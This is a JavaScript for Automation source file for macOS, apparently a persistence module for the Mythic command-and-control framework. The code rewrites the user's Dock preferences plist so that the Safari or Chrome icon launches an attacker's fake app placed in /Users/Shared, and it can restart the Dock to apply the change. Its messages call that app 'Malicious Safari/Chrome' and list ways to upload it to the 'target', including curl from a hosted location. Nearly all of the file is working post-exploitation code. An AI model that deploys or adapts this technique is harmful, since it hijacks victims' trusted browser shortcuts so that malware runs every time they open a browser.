function DockPersist(Browser, BundleID, ReloadNow) {
    ObjC.import('Foundation')
    ObjC.import('stdlib')
    var currentApp = Application.currentApplication();
    currentApp.includeStandardAdditions = true;
    var userHome = $.getenv('HOME')

    var output = ""
    var rand = Math.random().toString(36).substring(7);
    var tempWriteFile = "/private/tmp/temp" + rand
    var dockPlist = userHome + "/Library/Preferences/com.apple.dock.plist"

    function convertXML(toXML) {
        var path = "/usr/bin/plutil"
        var args = ["-convert", "xml1", toXML, "-o", "/private/tmp/temp9876", "&"]
        var pipe = $.NSPipe.pipe;
        var file = pipe.fileHandleForReading;
        var task = $.NSTask.alloc.init;
        task.launchPath = path;
        task.arguments = args;
        task.standardOutput = pipe;
        task.standardError = pipe;
        task.launch;
    }

    function convertbinary(toBinPlist) {
        var path = "/usr/bin/plutil"
        var args = ["-convert", "binary1", toBinPlist, "-o", tempWriteFile, "&"]
        var pipe = $.NSPipe.pipe;
        var file = pipe.fileHandleForReading;
        var task = $.NSTask.alloc.init;
        task.launchPath = path;
        task.arguments = args;
        task.standardOutput = pipe;
        task.standardError = pipe;
        task.launch;
    }

    function reloadDock() {
        var path = "/usr/bin/killall"
        var args = ["Dock"]
        var pipe = $.NSPipe.pipe;
        var file = pipe.fileHandleForReading;
        var task = $.NSTask.alloc.init;
        task.launchPath = path;
        task.arguments = args;
        task.standardOutput = pipe;
        task.standardError = pipe;
        task.launch;
    }

    function mv(at, to) {
        let a = $(at).stringByStandardizingPath
        let t = $(to).stringByStandardizingPath
        let e = $()
        let r = $.NSFileManager.defaultManager
            .moveItemAtPathToPathError(a, t, e)
        if (!e.isNil()) {
            let s1 = 'mv(): '
            let s2 = e.localizedDescription.js
            let s3 = e.localizedRecoverySuggestion.js || ''
            throw s1 + s2 + s3
        }
        return r
    }

    function rm(path) {
        let p = $(path).stringByStandardizingPath
        let e = $()
        let r = $.NSFileManager.defaultManager
            .removeItemAtPathError(p, e)
        return r
    }

    function readFile(file) {
        var fileString = file.toString()
        return currentApp.read(Path(fileString))
    }

    function writeTextToFile(text, file, overwriteExistingContent) {
        var fileString = file.toString()
        var openedFile = currentApp.openForAccess(Path(fileString), {
            writePermission: true
        })
        if (overwriteExistingContent) {
            currentApp.setEof(openedFile, {
                to: 0
            })
        }
        currentApp.write(text, {
            to: openedFile,
            startingAt: currentApp.getEof(openedFile)
        })
        currentApp.closeAccess(openedFile)
    }

    function listDirectory(strPath) {
        var fm = $.NSFileManager.defaultManager;
        return ObjC.unwrap(
                fm.contentsOfDirectoryAtPathError($(strPath)
                    .stringByExpandingTildeInPath, null))
            .map(ObjC.unwrap);
    }

    //Base64 encode/decode
    var Base64 = {
        _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

        // public method for encoding
        encode: function(input) {
            var output = "";
            var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
            var i = 0;

            input = Base64._utf8_encode(input);

            while (i < input.length) {

                chr1 = input.charCodeAt(i++);
                chr2 = input.charCodeAt(i++);
                chr3 = input.charCodeAt(i++);

                enc1 = chr1 >> 2;
                enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
                enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
                enc4 = chr3 & 63;

                if (isNaN(chr2)) {
                    enc3 = enc4 = 64;
                } else if (isNaN(chr3)) {
                    enc4 = 64;
                }

                output = output +
                    this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
                    this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);

            }

            return output;
        },

        // public method for decoding
        decode: function(input) {
            var output = "";
            var chr1, chr2, chr3;
            var enc1, enc2, enc3, enc4;
            var i = 0;

            input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

            while (i < input.length) {

                enc1 = this._keyStr.indexOf(input.charAt(i++));
                enc2 = this._keyStr.indexOf(input.charAt(i++));
                enc3 = this._keyStr.indexOf(input.charAt(i++));
                enc4 = this._keyStr.indexOf(input.charAt(i++));

                chr1 = (enc1 << 2) | (enc2 >> 4);
                chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                chr3 = ((enc3 & 3) << 6) | enc4;

                output = output + String.fromCharCode(chr1);

                if (enc3 != 64) {
                    output = output + String.fromCharCode(chr2);
                }
                if (enc4 != 64) {
                    output = output + String.fromCharCode(chr3);
                }

            }

            output = Base64._utf8_decode(output);

            return output;

        },

        // private method for UTF-8 encoding
        _utf8_encode: function(string) {
            string = string.replace(/\r\n/g, "\n");
            var utftext = "";

            for (var n = 0; n < string.length; n++) {

                var c = string.charCodeAt(n);

                if (c < 128) {
                    utftext += String.fromCharCode(c);
                } else if ((c > 127) && (c < 2048)) {
                    utftext += String.fromCharCode((c >> 6) | 192);
                    utftext += String.fromCharCode((c & 63) | 128);
                } else {
                    utftext += String.fromCharCode((c >> 12) | 224);
                    utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                    utftext += String.fromCharCode((c & 63) | 128);
                }

            }

            return utftext;
        },

        // private method for UTF-8 decoding
        _utf8_decode: function(utftext) {
            var string = "";
            var i = 0;
            var c = c1 = c2 = 0;

            while (i < utftext.length) {

                c = utftext.charCodeAt(i);

                if (c < 128) {
                    string += String.fromCharCode(c);
                    i++;
                } else if ((c > 191) && (c < 224)) {
                    c2 = utftext.charCodeAt(i + 1);
                    string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                    i += 2;
                } else {
                    c2 = utftext.charCodeAt(i + 1);
                    c3 = utftext.charCodeAt(i + 2);
                    string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                    i += 3;
                }

            }

            return string;
        }

    }

    const regex = /<data>[\s\S]*?<\/data>/gm;
    try {
        switch (Browser) {
            case "Safari":
                var FakeSafariExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPath('/Users/Shared/Safari.app')
                if (FakeSafariExistsCheck == true) {
                    //Due to Safari64 is the reason must be at /Users/Shared/
                    var OrgSafari = ""
                    var Safari64 = "Ym9va1wCAAAAAAQQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAEAAAQAAAADAwAAAAAAIAUAAAABAQAAVXNlcnMAAAAGAAAAAQEAAFNoYXJlZAAACgAAAAEBAABTYWZhcmkuYXBwAAAMAAAAAQYAABAAAAAgAAAAMAAAAAgAAAAEAwAAfVMAAAMAAAAIAAAABAMAAH9TAAADAAAACAAAAAQDAACpDAwAAwAAAAwAAAABBgAAWAAAAGgAAAB4AAAACAAAAAAEAABBwngkSWg59xgAAAABAgAAAgAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAAAAAAAEFAAAIAAAAAQkAAGZpbGU6Ly8vDAAAAAEBAABNYWNpbnRvc2ggSEQIAAAABAMAAABgf+sJAAAACAAAAAAEAABBwceD6M41tCQAAAABAQAAMEE4MUYzQjEtNTFEOS0zMzM1LUIzRTMtMTY5QzM2NDAzNjBEGAAAAAECAACBAAAAAQAAAO8TAAABAAAAAAAAAAAAAAABAAAAAQEAAC8AAAC0AAAA/v///wEAAAAAAAAADgAAAAQQAABEAAAAAAAAAAUQAACIAAAAAAAAABAQAACsAAAAAAAAAEAQAACcAAAAAAAAAAIgAABkAQAAAAAAAAUgAADUAAAAAAAAABAgAADkAAAAAAAAABEgAAAYAQAAAAAAABIgAAD4AAAAAAAAABMgAAAIAQAAAAAAACAgAABEAQAAAAAAADAgAADMAAAAAAAAAAHQAADMAAAAAAAAABDQAAAEAAAAAAAAAA=="
                    convertXML(dockPlist)
                    var XMLplist = readFile("/private/tmp/temp9876")
                    let m;
                    while ((m = regex.exec(XMLplist)) !== null) {
                        if (m.index === regex.lastIndex) {
                            regex.lastIndex++;
                        }
                        m.forEach((match, groupIndex) => {
                            var b64clean = match.replace("<data>", "").replace("</data>", "")
                            var decodedString = Base64.decode(b64clean)
                            if (decodedString.includes("Safari") == true) {
                                OrgSafari = b64clean
                            }
                        })
                    }

                    var replaceFake = Safari64
                    var b64replace = XMLplist.replace(OrgSafari, replaceFake)
                    var bundleFix = b64replace.replace("com.apple.Safari", BundleID)
                    var fixedXMLplist = bundleFix.replace("Applications/Safari.app", "Users/Shared/Safari.app")
                    writeTextToFile(fixedXMLplist, tempWriteFile, true)
                    convertbinary(tempWriteFile)
                    rm(dockPlist)
                    mv(tempWriteFile, dockPlist)
                    rm("/private/tmp/temp9876")
                    rm(tempWriteFile)

                    if (ReloadNow == "yes") {
                        reloadDock()
                    }
                    output += 'Safari Persistence installed. Successfully modified ~/Library/Preferences/com.apple.dock.plist'
                } else {
                    output += `Malicious Safari does not Exist. Upload to target
                 Options:
                     - zip file, use upload command in Mythic, then unzip to destination
                     - zip file, host somewhere, use curl to save on target, then unzip to destination
                     - zip file, base64 encode, base64 decode to save on target, then unzip to destination`
                }
                break;
            case "Google Chrome":
                var FakeChromeExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPath('/Users/Shared/Google\ Chrome.app')
                if (FakeChromeExistsCheck == true) {
                    //Due to Chrome64 is the reason must be at /Users/Shared/
                    var OrgChrome = ""
                    var Chrome64 = "Ym9va6ACAAAAAAQQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAqAEAAAQAAAADAwAAAAAAIAUAAAABAQAAVXNlcnMAAAAGAAAAAQEAAFNoYXJlZAAAEQAAAAEBAABHb29nbGUgQ2hyb21lLmFwcAAAAAwAAAABBgAAEAAAACAAAAAwAAAACAAAAAQDAAB9UwAAAwAAAAgAAAAEAwAAf1MAAAMAAAAIAAAABAMAAIPSEAADAAAADAAAAAEGAABgAAAAcAAAAIAAAAAIAAAAAAQAAEHCeHF4d1dpGAAAAAECAAACAAAAAAAAAA8AAAAAAAAAAAAAAAAAAAAAAAAAAQUAAAgAAAABCQAAZmlsZTovLy8MAAAAAQEAAE1hY2ludG9zaCBIRAgAAAAEAwAAAGB/6wkAAAAIAAAAAAQAAEHBx4PozjW0JAAAAAEBAAAwQTgxRjNCMS01MUQ5LTMzMzUtQjNFMy0xNjlDMzY0MDM2MEQYAAAAAQIAAIEAAAABAAAA7xMAAAEAAAAAAAAAAAAAAAEAAAABAQAALwAAABoAAAABAQAATlNVUkxEb2N1bWVudElkZW50aWZpZXJLZXkAAAQAAAADAwAACgAAAMAAAAD+////AQAAAAAAAAAPAAAABBAAAEwAAAAAAAAABRAAAJAAAAAAAAAAEBAAALQAAAAAAAAAQBAAAKQAAAAAAAAAAiAAAGwBAAAAAAAABSAAANwAAAAAAAAAECAAAOwAAAAAAAAAESAAACABAAAAAAAAEiAAAAABAAAAAAAAEyAAABABAAAAAAAAICAAAEwBAAAAAAAAMCAAANQAAAAAAAAAAdAAANQAAAAAAAAAENAAAAQAAAAAAAAAeAEAgJwBAAAAAAAA"
                    convertXML(dockPlist)
                    var XMLplist = readFile("/private/tmp/temp9876")
                    let m;
                    while ((m = regex.exec(XMLplist)) !== null) {
                        if (m.index === regex.lastIndex) {
                            regex.lastIndex++;
                        }
                        m.forEach((match, groupIndex) => {
                            var b64clean = match.replace("<data>", "").replace("</data>", "")
                            var decodedString = Base64.decode(b64clean)
                            if (decodedString.includes("Chrome") == true) {
                                OrgChrome = b64clean
                            }
                        })
                    }
                    var replaceFake = Chrome64
                    var b64replace = XMLplist.replace(OrgChrome, replaceFake)
                    var bundleFix = b64replace.replace("com.google.Chrome", BundleID)
                    var fixedXMLplist = bundleFix.replace("Google%20Chrome.app", "Users/Shared/Google%20Chrome.app")
                    writeTextToFile(fixedXMLplist, tempWriteFile, true)
                    convertbinary(tempWriteFile)
                    rm(dockPlist)
                    mv(tempWriteFile, dockPlist)
                    rm("/private/tmp/temp9876")
                    rm(tempWriteFile)

                    if (ReloadNow == "yes") {
                        reloadDock()
                    }
                    output += 'Chrome Persistence installed. Successfully modified ~/Library/Preferences/com.apple.dock.plist'
                } else {
                    output += `Malicious Chrome does not Exist. Upload to target
                    Options:
                        - zip file, use upload command in Mythic, then unzip to destination
                        - zip file, host somewhere, use curl to save on target, then unzip to destination
                        - zip file, base64 encode, base64 decode to save on target, then unzip to destination`
                }
                break;
            default:
                output += "Please Select Safari or Chrome"
        }
    } catch (error) {
        output += error.toString()
    }
    return output
}
